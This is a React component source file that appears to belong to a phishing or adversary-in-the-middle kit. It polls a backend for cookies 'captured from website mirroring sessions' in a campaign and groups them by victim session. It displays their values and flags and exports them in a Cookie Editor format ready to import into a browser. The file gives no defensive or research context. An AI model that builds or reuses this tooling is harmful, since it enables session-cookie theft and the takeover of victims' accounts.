// src/components/CookiesListener.jsx
import React, { useState, useEffect } from 'react';
import { ClipboardCopy, RefreshCw } from 'lucide-react';
import { downloadCookies, getCapturedCookies } from '../services/apiService';

const CookiesListener = ({ campaignId }) => {
  const [cookies, setCookies] = useState([]);
  const [cookiesBySession, setCookiesBySession] = useState({});
  const [loading, setLoading] = useState(false);
  const [lastUpdated, setLastUpdated] = useState(null);
  const [autoRefresh, setAutoRefresh] = useState(true);

  // Fetch cookies from database
  const fetchCookies = async () => {
    if (!campaignId) return;
    
    try {
      setLoading(true);
      const response = await getCapturedCookies(campaignId);
      
      if (response.data) {
        setCookies(response.data.allCookies || []);
        setCookiesBySession(response.data.cookiesBySession || {});
        setLastUpdated(new Date());
      }
    } catch (error) {
      console.error('Error fetching cookies:', error);
    } finally {
      setLoading(false);
    }
  };

  // Initial fetch and polling setup
  useEffect(() => {
    if (!campaignId) return;
    
    // Initial fetch
    fetchCookies();
    
    // Set up polling if auto-refresh is enabled
    let interval;
    if (autoRefresh) {
      interval = setInterval(fetchCookies, 5000); // Poll every 5 seconds
    }
    
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [campaignId, autoRefresh]);

  const handleCopy = (sessionToken) => {
    const sessionCookies = cookiesBySession[sessionToken] || [];
    navigator.clipboard.writeText(JSON.stringify(sessionCookies, null, 2));
    alert('Session cookies copied to clipboard');
  };

  const handleCopyAll = () => {
    navigator.clipboard.writeText(JSON.stringify(cookies, null, 2));
    alert('All cookies copied to clipboard');
  };

  const handleManualRefresh = () => {
    fetchCookies();
  };

  const formatCookieForDisplay = (cookie) => {
    // Format cookies in Cookie Editor compatible format
    return {
      name: cookie.name || '',
      value: cookie.value || '',
      domain: cookie.domain || '',
      hostOnly: Boolean(cookie.hostOnly),
      path: cookie.path || '/',
      secure: Boolean(cookie.secure),
      httpOnly: Boolean(cookie.httpOnly),
      sameSite: cookie.sameSite || 'unspecified',
      session: Boolean(cookie.session),
      firstPartyDomain: '',
      partitionKey: null,
      ...(cookie.expirationDate && !cookie.session ? { expirationDate: cookie.expirationDate } : {}),
      storeId: null
    };
  };

  if (!campaignId) {
    return (
      <div className="p-4 bg-white rounded shadow">
        <h2 className="text-lg font-semibold mb-2">Real-Time Cookie Capture</h2>
        <p className="text-gray-500">No campaign selected</p>
      </div>
    );
  }

  if (cookies.length === 0 && !loading) {
    return (
      <div className="p-4 bg-white rounded shadow">
        <div className="flex justify-between items-center mb-2">
          <h2 className="text-lg font-semibold">Real-Time Cookie Capture</h2>
          <div className="flex items-center space-x-2">
            <label className="flex items-center text-sm">
              <input
                type="checkbox"
                checked={autoRefresh}
                onChange={(e) => setAutoRefresh(e.target.checked)}
                className="mr-1"
              />
              Auto-refresh
            </label>
            <button
              onClick={handleManualRefresh}
              disabled={loading}
              className="p-1 bg-gray-200 rounded hover:bg-gray-300 disabled:opacity-50"
              title="Refresh cookies"
            >
              <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
            </button>
          </div>
        </div>
        <p className="text-gray-500">
          {loading ? 'Loading cookies...' : 'No cookies captured yet. Cookies will appear here as they are captured from website mirroring sessions.'}
        </p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header with controls */}
      <div className="p-4 bg-white rounded shadow">
        <div className="flex justify-between items-center mb-2">
          <h2 className="text-lg font-semibold">
            Real-Time Cookie Capture ({cookies.length} cookies)
          </h2>
          <div className="flex items-center space-x-2">
            <label className="flex items-center text-sm">
              <input
                type="checkbox"
                checked={autoRefresh}
                onChange={(e) => setAutoRefresh(e.target.checked)}
                className="mr-1"
              />
              Auto-refresh
            </label>
            <button
              onClick={handleManualRefresh}
              disabled={loading}
              className="p-1 bg-gray-200 rounded hover:bg-gray-300 disabled:opacity-50"
              title="Refresh cookies"
            >
              <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
            </button>
            <button
              onClick={handleCopyAll}
              className="px-3 py-1 bg-green-600 text-white text-sm rounded hover:bg-green-700"
              title="Copy all cookies"
            >
              Copy All
            </button>
          </div>
        </div>
        
        {lastUpdated && (
          <p className="text-xs text-gray-500">
            Last updated: {lastUpdated.toLocaleTimeString()}
          </p>
        )}
      </div>

      {/* Cookies grouped by session */}
      {Object.entries(cookiesBySession).map(([sessionToken, sessionCookies]) => (
        <div key={sessionToken} className="p-4 bg-white rounded shadow">
          <div className="flex justify-between items-center mb-3">
            <div>
              <span className="font-medium">Session: {sessionToken}</span>
              <span className="text-sm text-gray-500 ml-2">
                ({sessionCookies.length} cookies)
              </span>
            </div>
            <div className="flex space-x-2">
              <button
                onClick={() => handleCopy(sessionToken)}
                className="p-1 bg-gray-200 rounded hover:bg-gray-300"
                title="Copy session cookies"
              >
                <ClipboardCopy size={16} />
              </button>
            </div>
          </div>

          {/* Cookie list for this session */}
          <div className="space-y-2 max-h-80 overflow-y-auto">
            {sessionCookies.map((cookie, index) => (
              <div key={`${cookie.name}-${index}`} className="border rounded p-2 bg-gray-50">
                <div className="flex justify-between items-start">
                  <div className="flex-1">
                    <div className="font-mono text-sm">
                      <span className="font-semibold text-blue-600">{cookie.name}</span>
                      <span className="text-gray-500"> = </span>
                      <span className="text-green-600">
                        {cookie.value.length > 50 
                          ? `${cookie.value.substring(0, 50)}...` 
                          : cookie.value}
                      </span>
                    </div>
                    <div className="text-xs text-gray-500 mt-1 space-x-2">
                      <span>Domain: {cookie.domain}</span>
                      <span>Path: {cookie.path}</span>
                      {cookie.secure && <span className="text-orange-600">Secure</span>}
                      {cookie.httpOnly && <span className="text-red-600">HttpOnly</span>}
                      {cookie.session && <span className="text-purple-600">Session</span>}
                    </div>
                    <div className="text-xs text-gray-400 mt-1">
                      Updated: {new Date(cookie.lastUpdated).toLocaleString()}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>

          {/* Raw JSON view toggle */}
          <details className="mt-3">
            <summary className="cursor-pointer text-sm text-blue-600 hover:text-blue-800">
              View Raw JSON
            </summary>
            <pre className="bg-gray-100 p-3 rounded mt-2 max-h-60 overflow-auto text-xs">
              {JSON.stringify(sessionCookies.map(formatCookieForDisplay), null, 2)}
            </pre>
          </details>
        </div>
      ))}
    </div>
  );
};

export default CookiesListener;
